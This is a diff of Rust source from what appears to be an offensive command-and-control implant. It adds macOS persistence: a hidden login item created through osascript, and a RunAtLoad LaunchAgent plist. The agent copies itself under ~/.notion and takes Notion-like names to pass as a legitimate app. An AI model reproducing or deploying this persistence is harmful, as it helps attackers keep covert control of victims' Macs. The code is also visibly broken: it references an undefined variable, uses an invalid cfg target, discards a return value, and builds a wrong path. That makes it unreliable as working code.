@@ -177,7 +177,7 @@ pub async fn handle(cmd_args: &mut CommandArgs, config_options: &mut ConfigOptio
         }
     }
 
-    #[cfg(not(windows))] {
+    #[cfg(unix)] {
 
         let app_path = args().nth(0).unwrap();
         let home = var("HOME")?;
@@ -270,5 +270,75 @@ WantedBy=multi-user.target"
             }, 
             _         => Ok("Unknown persistence method!".to_string())
         }
+    }
+
+    #[cfg(macos)] {
+        let app_path = args().nth(0).unwrap();
+        let home = var("HOME")?;
+        let app_dir = format!("{home}/.notion");
+        let dest_path = format!("{app_dir}/notion");
+
+        match cmd_args.nth(0).unwrap_or_default().as_str() {
+            "loginitem" => {
+                // Copy the app to a new folder
+                match create_dir(&app_dir) {
+                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Err(e) => { logger.err(e.to_string()); }
+                };
+                if let Ok(_) = copy(&app_path, dest_path) {
+                    // Save config for relaunch
+                    let b64_config = config_options.to_base64();
+                    // Write a line to the user's bashrc that starts the agent.
+                    let mut applescript_args = CommandArgs::new(
+                        vec![format!(r#"osascript -e 'tell application "System Events" to make login item at end with properties {path:"{dest_path}/notion", hidden:true}'"#)]
+                    );
+                    if let Ok(_) = shell::handle(&mut bashrc_args).await {
+                        Ok("Login item created!".to_string())
+                    } else {
+                        Ok("Could not create login item".to_string())
+                    }
+                } else {
+                    Ok("Could not copy app to destination".to_string())
+                }
+
+            },
+            "launchagent" => {
+                
+                match create_dir(&app_dir) {
+                    Ok(_) => { logger.info("Notion directory created".to_string()); },
+                    Err(e) => { logger.err(e.to_string()); }
+                };    
+                if let Ok(_) = copy(&app_path, &dest_path) {
+                    let b64_config = config_options.to_base64();
+                    let launch_agent_path: String;
+                    if is_root() {
+                        launch_agent_path = "/Library/LaunchAgents/com.notion.offnote.plist".to_string();
+                    } else {
+                        launch_agent_path = format!("{home}/Library/LaunchAgents/com.notion.offnote.plist");
+                    }
+                    let launch_agent_string = format!(
+r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+<key>Label</key>
+<string>com.mttaggart.offensivenotion</string>
+<key>ProgramArguments</key>
+<array>
+<string>{dest_path}</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
+</plist>"#);
+                    write(launch_agent_path, launch_agent_string)?;
+                    Ok(format!("LaunchAgent written to {launch_agent_path}"));
+                } else {
+                    return Ok("Could not copy app to destination".to_string());
+                }
+            },
+            _ => Ok("Unknown persistence method!".to_string())
+        }
+
     }
 }
